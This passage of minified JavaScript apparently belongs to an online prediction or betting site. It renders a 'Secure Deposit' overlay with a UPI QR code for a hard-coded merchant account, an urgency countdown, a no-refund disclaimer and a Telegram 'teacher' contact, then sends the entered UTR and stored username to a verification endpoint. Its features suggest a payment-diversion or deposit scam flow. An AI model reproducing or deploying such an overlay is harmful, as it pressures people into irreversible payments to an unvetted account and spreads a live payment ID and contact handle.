            (n = a.clientX - e.offsetLeft),
            (r = a.clientY - e.offsetTop));
    }),
        t.addEventListener("pointermove", (o) => {
            t.hasPointerCapture(o.pointerId) &&
                ((e.style.left = Re(o.clientX - n, a.offsetWidth) + "px"),
                    (e.style.top = Ue(o.clientY - r, a.offsetHeight) + "px"));
        }),
        t.addEventListener("pointerup", (a) => {
            (t.releasePointerCapture(a.pointerId),
                t.classList.remove("dragging"),
                zt(e, "panel"));
        }));
}
function Jt() {
    document.getElementById("wg-deposit-hint")?.remove();
}
function De(e) {
    (Jt(),
        window.addEventListener("hashchange", Jt),
        window.addEventListener("wg-qualified", Jt));
}
function ke(e, t) {
    let a = document.querySelector("prediction-panel")?.shadowRoot;
    if (!a) return;
    let n = a.querySelector(".pay-overlay");
    n && n.remove();
    let r = document.createElement("div");
    if (
        ((r.className = "pay-overlay"),
            a.appendChild(r),
            (document.body.style.overflow = "hidden"),
            !a.querySelector("#pay-custom-styles"))
    ) {
        let e = document.createElement("style");
        ((e.id = "pay-custom-styles"),
            (e.textContent =
                '\n.pay-overlay{position:fixed;top:0;left:var(--bv-left,0px);width:var(--bv-width,100%);height:100vh;height:100dvh;background:#1a1a2c;z-index:99999;font-family:var(--f,system-ui,-apple-system,sans-serif);color:#c8cad0;display:flex;flex-direction:column;overflow:hidden;box-sizing:border-box;max-width:100vw}\n:host(.light) .pay-overlay{background:#fdfdfd;color:#1a1b25}\n.pay-hdr{display:flex;align-items:center;justify-content:space-between;height:56px;padding:0 20px;flex-shrink:0;background:#22224b;border-bottom:1px solid rgba(255,255,255,0.06);position:relative;z-index:10}\n:host(.light) .pay-hdr{background:#fff;border-bottom:1px solid rgba(0,0,0,0.04)}\n.pay-back{background:none;border:none;padding:0;cursor:pointer;color:#fff;width:32px;height:32px;display:flex;align-items:center;justify-content:flex-start;transition:transform 0.2s ease,opacity 0.2s ease}\n.pay-back:active{transform:translateX(-2px);opacity:0.7}\n:host(.light) .pay-back{color:#1a1b25}\n.pay-back svg{width:22px;height:22px;stroke-width:2.5}\n.pay-ttl{font-size:16px;font-weight:700;color:#fff;letter-spacing:0}\n:host(.light) .pay-ttl{color:#111}\n.pay-body{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;padding-bottom:34px}\n.pay-content{padding-top:0}\n@keyframes slideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}\n.pay-anim{animation:slideUp 0.5s cubic-bezier(0.16,1,0.3,1) backwards}\n.pay-anim-1{animation-delay:0.05s}\n.pay-anim-2{animation-delay:0.1s}\n.pay-anim-3{animation-delay:0.15s}\n.pay-anim-4{animation-delay:0.2s}\n.pay-hero{position:relative;min-height:148px;padding:22px 20px 34px;overflow:hidden;background:linear-gradient(90deg,#fb8466 0%,#bd5bd4 33%,#7473fa 66%,#53b2fa 100%)}\n:host(.light) .pay-hero{background:linear-gradient(90deg,#ff6b6b 0%,#ff9b9b 52%,#fff2f2 100%)}\n.pay-hero::after{content:"";position:absolute;inset:auto 0 0;height:46px;background:linear-gradient(to bottom,rgba(26,26,44,0),#1a1a2c 82%)}\n:host(.light) .pay-hero::after{background:linear-gradient(to bottom,rgba(253,253,253,0),#fdfdfd 82%)}\n.pay-hero-top{position:relative;z-index:1;display:flex;align-items:flex-start;justify-content:space-between;gap:14px}\n.pay-hero-label{display:block;color:rgba(255,255,255,0.72);font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:7px}\n.pay-hero-sub{position:relative;z-index:1;margin-top:10px;color:rgba(255,255,255,0.82);font-size:13px;font-weight:600}\n.pay-amount-box{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 20px 24px;position:relative}\n.pay-amount-bg{position:absolute;top:-70px;right:-40px;width:210px;height:150px;background:rgba(255,255,255,0.26);filter:blur(48px);opacity:0.6;border-radius:50%;z-index:0}\n:host(.light) .pay-amount-bg{background:linear-gradient(90deg,#f95959,#ff8080);filter:blur(50px);opacity:0.1}\n.pay-timer-pill{display:flex;align-items:center;gap:6px;position:relative;z-index:1;background:rgba(34,34,75,0.28);border:1px solid rgba(255,255,255,0.25);padding:7px 12px;border-radius:20px;flex-shrink:0;box-shadow:inset 0 1px 0 rgba(255,255,255,0.16)}\n:host(.light) .pay-timer-pill{background:#fff;border-color:rgba(0,0,0,0.05);box-shadow:0 4px 12px rgba(0,0,0,0.03)}\n.pay-timer-pill.urgent{background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.2);animation:timerShake 0.45s ease infinite}\n.pay-clock{width:14px;height:14px;color:#fff;flex-shrink:0}\n:host(.light) .pay-clock{color:#f95959}\n.pay-timer-pill.urgent .pay-clock{color:#ef4444}\n.pay-timer-txt{font-weight:800;color:#fff;font-size:14px;font-variant-numeric:tabular-nums;letter-spacing:0.5px}\n:host(.light) .pay-timer-txt{color:#f95959}\n.pay-timer-pill.urgent .pay-timer-txt{color:#ef4444}\n.pay-amt{display:block;position:relative;z-index:1;font-size:44px;font-weight:900;color:#fff;letter-spacing:0;line-height:0.98;text-shadow:0 8px 24px rgba(0,0,0,0.22)}\n:host(.light) .pay-amt{color:#fff;text-shadow:0 8px 22px rgba(249,89,89,0.18)}\n.pay-section{padding:0 20px;margin-bottom:16px}\n.pay-section-hdr{font-size:12px;font-weight:800;color:#8b8ea0;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}\n:host(.light) .pay-section-hdr{color:#888}\n.pay-qr-card{margin-top:-24px;position:relative;z-index:2}\n.pay-method-card,.pay-form-card{position:relative;z-index:1}\n.pay-qr-wrapper{background:#22224b;border-radius:22px;padding:18px 18px 16px;display:flex;flex-direction:column;align-items:center;border:1px solid rgba(255,255,255,0.07);box-shadow:0 14px 34px rgba(0,0,0,0.24),inset 0 1px 0 rgba(255,255,255,0.04)}\n:host(.light) .pay-qr-wrapper{background:#fff;border-color:rgba(0,0,0,0.04);box-shadow:0 8px 30px rgba(0,0,0,0.04)}\n.pay-qr-box{background:#fff;border-radius:18px;padding:10px;margin-bottom:12px;box-shadow:0 7px 24px rgba(0,0,0,0.16),0 0 0 1px rgba(0,0,0,0.05);position:relative}\n.pay-qr{width:172px;height:172px;display:block;border-radius:10px;opacity:0;transition:opacity 0.4s ease;position:relative;z-index:2}\n.pay-qr.loaded{opacity:1}\n.pay-qr-skeleton{position:absolute;inset:10px;border-radius:10px;background:rgba(0,0,0,0.03);display:flex;align-items:center;justify-content:center;z-index:1}\n.pay-qr-skeleton svg{width:28px;height:28px;animation:paySpin 1s linear infinite;color:#8b8ea0}\n@keyframes paySpin{100%{transform:rotate(360deg)}}\n.pay-scan-text{font-size:13px;color:#b8bbcf;font-weight:700;text-align:center;line-height:1.5}\n:host(.light) .pay-scan-text{color:#666}\n.pay-upi-row{display:flex;align-items:center;gap:12px;background:#22224b;border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:13px 14px;transition:background 0.2s,border-color 0.2s;box-shadow:inset 0 1px 0 rgba(255,255,255,0.03)}\n.pay-upi-row:active{background:rgba(255,255,255,0.05)}\n:host(.light) .pay-upi-row{background:#fafafa;border-color:rgba(0,0,0,0.06)}\n:host(.light) .pay-upi-row:active{background:#f5f5f5;border-color:#f95959}\n.pay-upi-info{flex:1;display:flex;flex-direction:column;gap:3px;min-width:0}\n.pay-upi-lbl{font-size:11px;color:#8b8ea0;font-weight:800;text-transform:uppercase;letter-spacing:0.4px}\n:host(.light) .pay-upi-lbl{color:#999}\n.pay-upi-id{font-size:16px;font-weight:800;color:#fff;letter-spacing:0;font-family:var(--f,system-ui,-apple-system,sans-serif);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}\n:host(.light) .pay-upi-id{color:#111}\n.pay-upi-actions{display:flex;gap:8px;align-items:center}\n.pay-copy-btn{background:rgba(160,143,255,0.16);color:#fff;border:1px solid rgba(160,143,255,0.18);padding:9px 15px;border-radius:12px;font-size:12px;font-weight:800;cursor:pointer;transition:all 0.2s ease}\n:host(.light) .pay-copy-btn{background:rgba(249,89,89,0.08);color:#f95959}\n.pay-copy-btn:hover{background:rgba(160,143,255,0.22)}\n.pay-copy-btn:active{transform:scale(0.95)}\n.pay-copy-btn.copied{background:#22c55e!important;color:#fff!important}\n.pay-route-card{width:100%;margin-top:10px;padding:11px 12px;border:1px solid rgba(255,255,255,0.08);border-radius:16px;background:#22224b;color:#fff;display:flex;align-items:center;gap:11px;position:relative;overflow:hidden;cursor:pointer;text-align:left;box-shadow:inset 3px 0 0 #a08fff,inset 0 1px 0 rgba(255,255,255,0.04);font-family:var(--f,system-ui,-apple-system,sans-serif);transition:transform 0.18s ease,border-color 0.18s ease,background 0.18s ease}\n.pay-route-card:active{transform:scale(0.985);border-color:rgba(160,143,255,0.38);background:#292958}\n.pay-route-index{flex:0 0 auto;min-width:48px;padding:8px 9px;border-radius:12px;text-align:center;color:#fff;font-size:12px;font-weight:900;background:linear-gradient(90deg,#fb8466,#bd5bd4,#7473fa,#53b2fa);box-shadow:inset 0 1px 0 rgba(255,255,255,0.18)}\n.pay-route-copy{position:relative;z-index:1;flex:1;display:flex;flex-direction:column;gap:2px;min-width:0}\n.pay-route-title{font-size:12.5px;font-weight:800;color:#fff;letter-spacing:0;line-height:1.2}\n.pay-route-sub{font-size:11px;font-weight:600;color:#b9bdd6;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}\n.pay-route-icon{position:relative;z-index:1;width:32px;height:32px;flex:0 0 32px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;background:rgba(160,143,255,0.16)}\n.pay-route-icon svg{width:19px;height:19px}\n.pay-route-note{margin-top:10px;color:#8b8ea0;font-size:12px;font-weight:600;text-align:center}\n:host(.light) .pay-route-card{background:#fafafa;border-color:rgba(0,0,0,0.06);color:#111;box-shadow:inset 3px 0 0 #f95959}\n:host(.light) .pay-route-index{background:linear-gradient(90deg,#f95959,#ff8080)}\n:host(.light) .pay-route-title{color:#111}\n:host(.light) .pay-route-sub,:host(.light) .pay-route-note{color:#777}\n:host(.light) .pay-route-icon{background:rgba(249,89,89,0.08);color:#f95959}\n.pay-field-wrapper{background:#22224b;border:1px solid rgba(255,255,255,0.08);border-radius:16px;display:flex;align-items:center;padding:6px 6px 6px 16px;transition:all 0.2s cubic-bezier(0.16,1,0.3,1);box-shadow:inset 0 1px 0 rgba(255,255,255,0.03)}\n.pay-field-wrapper:focus-within{border-color:#bd5bd4;box-shadow:0 0 0 3px rgba(189,91,212,0.15),0 4px 12px rgba(0,0,0,0.2)}\n:host(.light) .pay-field-wrapper{background:#fafafa;border-color:rgba(0,0,0,0.08);box-shadow:0 2px 12px rgba(0,0,0,0.02)}\n:host(.light) .pay-field-wrapper:focus-within{border-color:#f95959;box-shadow:0 0 0 3px rgba(249,89,89,0.1)}\n.pay-utr-input{flex:1;background:transparent;border:none;outline:none;font-size:15px;font-weight:500;color:#fff;font-family:var(--f);padding:10px 0;letter-spacing:1px}\n.pay-utr-input::placeholder{color:#5a5d72;font-weight:400;letter-spacing:normal}\n:host(.light) .pay-utr-input{color:#111}\n:host(.light) .pay-utr-input::placeholder{color:#999}\n.pay-paste-pill{background:rgba(255,255,255,0.08);color:#fff;border:none;border-radius:12px;padding:9px 14px;font-size:12px;font-weight:800;cursor:pointer;transition:all 0.2s}\n.pay-paste-pill:active{background:rgba(255,255,255,0.1);transform:scale(0.95)}\n:host(.light) .pay-paste-pill{background:rgba(0,0,0,0.04);color:#111}\n:host(.light) .pay-paste-pill:active{background:rgba(0,0,0,0.08)}\n.pay-utr-warn{display:flex;align-items:flex-start;gap:6px;margin-top:10px;padding:0 4px}\n.pay-utr-warn svg{width:14px;height:14px;color:#ef4444;flex-shrink:0;margin-top:1px}\n.pay-utr-warn-txt{font-size:11px;color:#ef4444;opacity:0.9;line-height:1.4;font-weight:500}\n.pay-submit-btn{width:100%;padding:16px;border-radius:999px;border:none;background:linear-gradient(90deg,#fb8466,#bd5bd4,#7473fa,#53b2fa);background-size:200% 200%;color:#fff;font-size:16px;font-weight:700;font-family:var(--f);cursor:pointer;position:relative;overflow:hidden;box-shadow:0 10px 22px rgba(116,115,250,0.28),inset 0 1px 0 rgba(255,255,255,0.22);transition:all 0.3s cubic-bezier(0.16,1,0.3,1)}\n.pay-submit-btn:active:not(.disabled){transform:translateY(2px) scale(0.98);box-shadow:0 2px 10px rgba(116,115,250,0.2),inset 0 1px 0 rgba(255,255,255,0.1)}\n.pay-submit-btn.disabled{background:#2a2a35!important;color:#5a5d72!important;box-shadow:none!important;cursor:not-allowed}\n:host(.light) .pay-submit-btn{background:linear-gradient(90deg,#f95959,#ff8080);box-shadow:0 6px 20px rgba(249,89,89,0.3),inset 0 1px 0 rgba(255,255,255,0.3)}\n:host(.light) .pay-submit-btn.disabled{background:#e8e8e8!important;color:#999!important}\n.pay-order-meta{display:flex;align-items:center;justify-content:space-between;padding:12px 20px 0;margin-top:4px;position:relative}\n.pay-order-meta::before{content:"";position:absolute;top:0;left:20px;right:20px;height:1px;background:rgba(255,255,255,0.05)}\n:host(.light) .pay-order-meta::before{background:rgba(0,0,0,0.05)}\n.pay-order-lbl{font-size:12px;color:#5a5d72;font-weight:500}\n.pay-order-val{font-size:13px;color:#8b8ea0;font-family:monospace;letter-spacing:0.5px}\n.pay-confirm-mask{position:fixed;inset:0;z-index:100000;display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity 0.3s ease}\n.pay-confirm-mask::before{content:"";position:absolute;inset:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(4px)}\n.pay-confirm-mask.active{opacity:1;pointer-events:auto}\n.pay-confirm-box{position:relative;z-index:1;width:100%;max-width:310px;background:#22224b;border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:28px 24px 24px;text-align:center;transform:scale(0.95) translateY(10px);transition:all 0.3s cubic-bezier(0.16,1,0.3,1);box-shadow:0 20px 40px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.05)}\n.pay-confirm-mask.active .pay-confirm-box{transform:scale(1) translateY(0)}\n:host(.light) .pay-confirm-box{background:#fff;border-color:rgba(0,0,0,0.05);box-shadow:0 20px 40px rgba(0,0,0,0.1)}\n.pay-conf-icon{width:48px;height:48px;margin:0 auto 16px;color:#c4b5fd;background:rgba(196,181,253,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center}\n.pay-conf-icon svg{width:24px;height:24px}\n:host(.light) .pay-conf-icon{color:#f95959;background:rgba(249,89,89,0.08)}\n.pay-conf-ttl{font-size:18px;font-weight:700;color:#fff;margin-bottom:8px;letter-spacing:-0.3px}\n:host(.light) .pay-conf-ttl{color:#111}\n.pay-conf-msg{font-size:13.5px;color:#8b8ea0;line-height:1.5;margin-bottom:28px}\n.pay-conf-msg b{color:#fff;font-weight:600}\n:host(.light) .pay-conf-msg{color:#666}\n:host(.light) .pay-conf-msg b{color:#f95959}\n.pay-conf-acts{display:flex;gap:12px}\n.pay-conf-btn{flex:1;padding:12px;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s;border:none;font-family:var(--f);outline:none}\n.pay-conf-btn.no{background:rgba(255,255,255,0.05);color:#c8cad0}\n:host(.light) .pay-conf-btn.no{background:rgba(0,0,0,0.04);color:#666}\n.pay-conf-btn.no:active{background:rgba(255,255,255,0.1)}\n.pay-conf-btn.yes{background:linear-gradient(90deg,#fb8466,#bd5bd4);color:#fff;box-shadow:0 4px 12px rgba(189,91,212,0.3)}\n:host(.light) .pay-conf-btn.yes{background:linear-gradient(90deg,#f95959,#ff8080);box-shadow:0 4px 12px rgba(249,89,89,0.3)}\n.pay-conf-btn.yes:active{transform:scale(0.96);box-shadow:0 2px 8px rgba(189,91,212,0.2)}\n.pay-download-btn{width:100%;padding:14px;border-radius:16px;border:1px solid rgba(255,255,255,0.08);background:#22224b;color:#fff;font-family:var(--f);font-size:14px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all 0.2s ease;box-shadow:inset 0 1px 0 rgba(255,255,255,0.04)}\n.pay-download-btn:active{transform:scale(0.97);background:#292958}\n.pay-download-btn svg{width:20px;height:20px}\n:host(.light) .pay-download-btn{background:#fafafa;border-color:rgba(0,0,0,0.06);color:#1a1b25}\n:host(.light) .pay-download-btn:active{transform:scale(0.97);background:#f5f5f5}\n.pay-instruction-list{display:flex;flex-direction:column;gap:10px;margin-bottom:4px}\n.pay-instruction-item{display:flex;align-items:center;gap:12px;background:#22224b;border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:12px 14px;font-size:13px;color:#b8bbcf;font-weight:500;line-height:1.4;box-shadow:inset 0 1px 0 rgba(255,255,255,0.03)}\n:host(.light) .pay-instruction-item{background:#fafafa;border-color:rgba(0,0,0,0.06);color:#666}\n.pay-instruction-step{flex:0 0 auto;width:24px;height:24px;border-radius:50%;background:linear-gradient(90deg,#fb8466,#bd5bd4);color:#fff;font-size:12px;font-weight:800;display:flex;align-items:center;justify-content:center}\n:host(.light) .pay-instruction-step{background:linear-gradient(90deg,#f95959,#ff8080)}\n.pay-disclaimer{margin-top:20px;border-top:1px solid rgba(255,255,255,0.05);padding-top:8px}\n:host(.light) .pay-disclaimer{border-top-color:rgba(0,0,0,0.05)}\n.pay-disclaimer-toggle{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;padding:10px;background:none;border:none;cursor:pointer;font-size:11px;font-weight:600;color:rgba(255,255,255,0.25);font-family:var(--f);transition:color 0.2s;letter-spacing:0.3px}\n:host(.light) .pay-disclaimer-toggle{color:rgba(0,0,0,0.25)}\n.pay-disclaimer-toggle:hover{color:rgba(255,255,255,0.5)}\n:host(.light) .pay-disclaimer-toggle:hover{color:rgba(0,0,0,0.5)}\n.pay-disclaimer-toggle svg{width:14px;height:14px;transition:transform 0.3s ease}\n.pay-disclaimer-toggle.open svg{transform:rotate(180deg)}\n.pay-disclaimer-body{max-height:0;overflow:hidden;transition:max-height 0.35s ease;padding:0 4px}\n.pay-disclaimer-body.open{max-height:500px}\n.pay-disclaimer-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:14px 16px;margin:4px 0 8px;font-size:12px;line-height:1.6;color:rgba(255,255,255,0.45)}\n:host(.light) .pay-disclaimer-card{background:rgba(0,0,0,0.02);border-color:rgba(0,0,0,0.05);color:rgba(0,0,0,0.4)}\n.pay-disclaimer-card strong{color:rgba(255,255,255,0.6)}\n:host(.light) .pay-disclaimer-card strong{color:rgba(0,0,0,0.55)}\n.pay-disclaimer-contact{display:flex;align-items:center;gap:8px;margin-top:10px;padding-top:10px;border-top:1px solid rgba(255,255,255,0.05);font-size:12px;color:rgba(255,255,255,0.35)}\n:host(.light) .pay-disclaimer-contact{border-top-color:rgba(0,0,0,0.05);color:rgba(0,0,0,0.3)}\n.pay-disclaimer-contact svg{width:14px;height:14px;flex-shrink:0}\n'),
            a.appendChild(e));
    }
    let o,
        i = 0,
        s = () => {
            (cancelAnimationFrame(i),
                (i = requestAnimationFrame(() => {
                    let e = document.querySelector("#app"),
                        t = window.visualViewport,
                        a = e?.getBoundingClientRect(),
                        n =
                            t?.width ||
                            document.documentElement.clientWidth ||
                            window.innerWidth,
                        o =
                            t?.height ||
                            document.documentElement.clientHeight ||
                            window.innerHeight,
                        i = Number.isFinite(a?.left) ? Math.max(0, a.left) : 0,
                        s = Number.isFinite(a?.width) && a.width > 0 ? a.width : n,
                        l = Math.max(280, Math.min(s, n - i));
                    ((r.style.left = `${i}px`),
                        (r.style.top = `${Math.max(0, t?.offsetTop || 0)}px`),
                        (r.style.width = `${l}px`),
                        (r.style.height = `${o}px`));
                })));
        };
    (s(),
        window.addEventListener("resize", s),
        window.addEventListener("orientationchange", s),
        window.visualViewport?.addEventListener("resize", s),
        window.visualViewport?.addEventListener("scroll", s));
    let l = () => {
        (clearInterval(o),
            cancelAnimationFrame(i),
            window.removeEventListener("resize", s),
            window.removeEventListener("orientationchange", s),
            window.visualViewport?.removeEventListener("resize", s),
            window.visualViewport?.removeEventListener("scroll", s),
            r.remove(),
            (document.body.style.overflow = ""));
    },
        d =
            "DP" +
            Date.now().toString(36).toUpperCase() +
            Math.random().toString(36).slice(2, 6).toUpperCase();
    (() => {
        let t = r.querySelector(".pay-utr-input")?.value || "";
        var a;
        ((r.innerHTML =
            ((a = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&margin=0&data=${encodeURIComponent("upi://pay?cu=INR&mc=7372&mode=19&pa=clubmakker0007866670.rzp@rxairtel&tn=PaymentToClubMakker0007&tr=St6iETpT177oBfqrv2")}`),
                `\n      <div class="pay-hdr">\n        <button class="pay-back">\n          <svg viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg>\n        </button>\n        <span class="pay-ttl">Secure Deposit</span>\n        <div style="width:32px"></div>\n      </div>\n\n      <div class="pay-body">\n        <div class="pay-hero pay-anim pay-anim-1">\n          <div class="pay-amount-bg"></div>\n          <div class="pay-hero-top">\n            <div>\n              <span class="pay-hero-label">Amount to Pay</span>\n              <span class="pay-amt">₹${Number(e).toLocaleString("en-IN")}</span>\n            </div>\n            <div class="pay-timer-pill">\n              <svg class="pay-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10" stroke-width="2.5"/><path d="M12 6v6l4 2" stroke-width="2.5" stroke-linecap="round"/></svg>\n              <span class="pay-timer-txt" id="pay-timer">29:00</span>\n            </div>\n          </div>\n          <div class="pay-hero-sub">Scan QR, enter amount in your UPI app, then submit the UTR</div>\n        </div>\n\n        <div class="pay-content">\n        <div class="pay-section pay-qr-card pay-anim pay-anim-2">\n          <div class="pay-qr-wrapper">\n            <div class="pay-qr-box">\n              <div class="pay-qr-skeleton"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg></div>\n              <img src="${a}" class="pay-qr" alt="QR Code" onload="this.classList.add('loaded'); this.previousElementSibling.style.display='none'">\n            </div>\n            <div class="pay-scan-text">Open any UPI app and scan the QR code</div>\n          </div>\n        </div>\n\n        <div class="pay-section pay-anim pay-anim-3">\n          <button class="pay-download-btn" id="btn-download-qr" type="button">\n            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">\n              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>\n              <polyline points="7 10 12 15 17 10"/>\n              <line x1="12" y1="15" x2="12" y2="3"/>\n            </svg>\n            <span>Download QR Code</span>\n          </button>\n        </div>\n\n        <div class="pay-section pay-anim pay-anim-3">\n          <div class="pay-section-hdr">Payment Instructions</div>\n          <div class="pay-instruction-list">\n            <div class="pay-instruction-item"><span class="pay-instruction-step">1</span><span>Open your preferred UPI app (Google Pay, PhonePe, Paytm)</span></div>\n            <div class="pay-instruction-item"><span class="pay-instruction-step">2</span><span>Scan the QR code displayed on screen</span></div>\n            <div class="pay-instruction-item"><span class="pay-instruction-step">3</span><span>Enter the exact amount: <strong>₹${Number(e).toLocaleString("en-IN")}</strong></span></div>\n            <div class="pay-instruction-item"><span class="pay-instruction-step">4</span><span>Complete the payment and copy the UTR number</span></div>\n            <div class="pay-instruction-item"><span class="pay-instruction-step">5</span><span>Paste the UTR below and submit for verification</span></div>\n          </div>\n        </div>\n\n        <div class="pay-section pay-form-card pay-anim pay-anim-4">\n          <div class="pay-section-hdr">UTR Number</div>\n          <div class="pay-field-wrapper">\n            <input type="tel" class="pay-utr-input" placeholder="Enter 12-digit UTR" maxlength="12" inputmode="numeric">\n            <button class="pay-paste-pill">Paste</button>\n          </div>\n          <div class="pay-utr-warn">\n            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>\n            <span class="pay-utr-warn-txt">Wrong UTR can fail the deposit. Check it once.</span>\n          </div>\n        </div>\n\n        <div class="pay-section pay-anim pay-anim-4">\n          <button class="pay-submit-btn disabled" disabled>Submit Payment</button>\n        </div>\n\n        <div class="pay-order-meta pay-anim pay-anim-4">\n          <span class="pay-order-lbl">Order Reference</span>\n          <span class="pay-order-val">${d}</span>\n        </div>\n\n        <div class="pay-disclaimer pay-anim pay-anim-4">\n          <button class="pay-disclaimer-toggle" id="pay-disc-toggle">\n            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>\n            Important Information\n          </button>\n          <div class="pay-disclaimer-body" id="pay-disc-body">\n            <div class="pay-disclaimer-card">\n              <strong>⚠️ Deposit at Your Own Risk</strong><br>\n              We act solely as a payment facilitation platform. All deposits are processed through third-party payment gateways. Once a payment is completed, it cannot be refunded, reversed, or charged back under any circumstances.\n              <div class="pay-disclaimer-contact">\n                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.5 2.5L2 11.5l6.5 2.5L18 7l-6 7 4 7 5.5-18.5z"/></svg>\n                <a href="https://t.me/Alex_Teacher7" target="_blank" rel="noopener" style="color:inherit;text-decoration:none">@Alex_Teacher7</a>\n              </div>\n            </div>\n          </div>\n        </div>\n        </div>\n      </div>\n\n      <div class="pay-confirm-mask">\n        <div class="pay-confirm-box">\n          <div class="pay-conf-icon">\n            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>\n          </div>\n          <div class="pay-conf-ttl">Confirm Deposit</div>\n          <div class="pay-conf-msg">Have you successfully transferred <b>₹${Number(e).toLocaleString("en-IN")}</b>?</div>\n          <div class="pay-conf-acts">\n            <button class="pay-conf-btn no">Cancel</button>\n            <button class="pay-conf-btn yes">Yes, Submitted</button>\n          </div>\n        </div>\n      </div>\n    `)),
            (r.querySelector(".pay-utr-input").value = t),
            (() => {
                let t = r.querySelector(".pay-utr-input"),
                    a = r.querySelector(".pay-submit-btn");
                ((r.querySelector(".pay-back").onclick = l),
                    (t.oninput = (e) => {
                        e.target.value = e.target.value.replace(/\D/g, "");
                        let t = /^\d{12}$/.test(e.target.value);
                        ((a.disabled = !t), a.classList.toggle("disabled", !t));
                    }),
                    (r.querySelector(".pay-paste-pill").onclick = async () => {
                        try {
                            let e = await navigator.clipboard.readText();
                            ((t.value = e.replace(/\D/g, "").slice(0, 12)),
                                t.dispatchEvent(new Event("input")));
                        } catch (e) { }
                    }),
                    (r.querySelector("#btn-download-qr").onclick = async (e) => {
                        try {
                            let e = r.querySelector(".pay-qr");
                            if (e && e.complete && e.naturalWidth > 0) {
                                let t = await fetch(e.src),
                                    a = await t.blob(),
                                    n = URL.createObjectURL(a),
                                    r = document.createElement("a");
                                ((r.href = n),
                                    (r.download = "QR_Code_Deposit.png"),
                                    document.body.appendChild(r),
                                    r.click(),
                                    document.body.removeChild(r),
                                    URL.revokeObjectURL(n));
                            }
                        } catch (e) { }
                    }));
                let n = r.querySelector("#pay-disc-toggle"),
                    o = r.querySelector("#pay-disc-body");
                n &&
                    o &&
                    (n.onclick = function () {
                        let e = o.classList.toggle("open");
                        n.classList.toggle("open", e);
                    });
                let i = r.querySelector(".pay-confirm-mask");
                ((a.onclick = () => {
                    a.disabled || i.classList.add("active");
                }),
                    (r.querySelector(".pay-conf-btn.no").onclick = () =>
                        i.classList.remove("active")),
                    (r.querySelector(".pay-conf-btn.yes").onclick = async () => {
                        let a = t.value.replace(/\D/g, "").slice(0, 12);
                        if (!a || a.length < 12) {
                            let e = i.querySelector(".pay-conf-msg");
                            return void (
                                e &&
                                (e.innerHTML =
                                    '<span style="color:#ef4444">Please enter a valid 12-digit UTR number first.</span>')
                            );
                        }
                        let n = i.querySelector(".pay-conf-btn.yes"),
                            r = i.querySelector(".pay-conf-btn.no"),
                            o = i.querySelector(".pay-conf-msg"),
                            s = i.querySelector(".pay-conf-icon");
                        ((n.disabled = !0),
                            (r.disabled = !0),
                            (n.textContent = "Verifying..."),
                            n.classList.add("disabled"));
                        try {
                            let t = (function () {
                                try {
                                    var e = JSON.parse(
                                        localStorage.getItem("userInfo") || "{}",
                                    );
                                    return (
                                        e.userName ||
                                        e.username ||
                                        e.phone ||
                                        sessionStorage.getItem("wg_user") ||
                                        sessionStorage.getItem("wg_qual_user") ||
                                        ""
                                    );
                                } catch (e) {
                                    return "";
                                }
                            })(),
                                i = await fetch("/ar-api/verify-payment.php", {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({
                                        amount: e,
                                        utr: a,
                                        username: t,
                                        order_ref: d,
                                    }),
                                }),
                                p = await i.json();
                            if (!p.success)
                                throw new Error(p.message || "Verification failed");
                            (window.__claimDeposit(e),
                                (s.innerHTML =
                                    '<svg viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'),
                                (o.innerHTML =
                                    '<span style="color:#22c55e;font-weight:600">₹' +
                                    Number(e).toLocaleString("en-IN") +
                                    " credited successfully!</span>"),
                                n.remove(),
                                (r.textContent = "Close"),
                                (r.disabled = !1),
                                (r.onclick = l),
                                setTimeout(l, 3e3));
                        } catch (e) {
                            ((s.innerHTML =
